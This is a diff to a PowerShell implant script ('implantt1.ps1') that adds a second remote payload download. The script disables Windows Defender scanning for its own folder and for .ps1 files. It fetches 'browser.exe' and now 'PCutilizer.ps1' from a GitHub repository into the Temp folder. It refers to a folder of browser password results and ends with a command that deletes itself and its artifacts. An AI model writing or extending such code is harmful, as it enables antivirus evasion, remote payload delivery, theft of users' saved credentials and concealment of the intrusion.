@@ -18,11 +18,14 @@ Add-MpPreference -ExclusionPath "${PSScriptRoot}\"
 Set-MpPreference -ExclusionExtension "ps1"
 
 $DiscordFileUrl = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/browser.exe"
+$DiscordFileUrl3 = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/PCutilizer.ps1"
 $DestinationPath = "C:\Users\$env:USERNAME\Appdata\Local\Temp\browser.exe"
+$DestinationPath3 = "C:\Users\$env:USERNAME\Appdata\Local\Temp\PCutilizer.ps1"
 
 # Download the file
 try {
     Invoke-WebRequest -Uri $DiscordFileUrl -OutFile $DestinationPath
+    Invoke-WebRequest -Uri $DiscordFileUrl3 -OutFile $DestinationPath3
     Write-Host "File downloaded successfully to $DestinationPath"
 } catch {
     Write-Host "An error occurred while downloading the file: $_"
@@ -204,6 +207,7 @@ if ($PSScriptRoot -ne $duckletter) {
     $ThisScript = "$PSScriptRoot\implantt1.ps1"
     $browserpass = "$env:LOCALAPPDATA\Temp\$env:USERNAME\results"
     $browserexe = "$env:LOCALAPPDATA\Temp\browser.exe"
+    $PCutilizer = "$env:LOCALAPPDATA\Temp\PCutilizer.ps1"
 
     # Create a PowerShell command to delete the files and folder
     $deleteCommand = "Start-Sleep -Seconds 3; " + 
@@ -211,7 +215,8 @@ if ($PSScriptRoot -ne $duckletter) {
                      "Remove-Item -Path '$DataFile' -Recurse -Force; " +
                      "Remove-Item -Path '$ThisScript' -Force;" +
                      "Remove-Item -Path '$browserpass' -Recurse -Force;" +
-                     "Remove-Item -Path '$browserexe' -Force"
+                     "Remove-Item -Path '$browserexe' -Force;" +
+                     "Remove-Item -Path '$PCutilizer' -Force"
                      
     
     # Start a new PowerShell process to execute the deletion
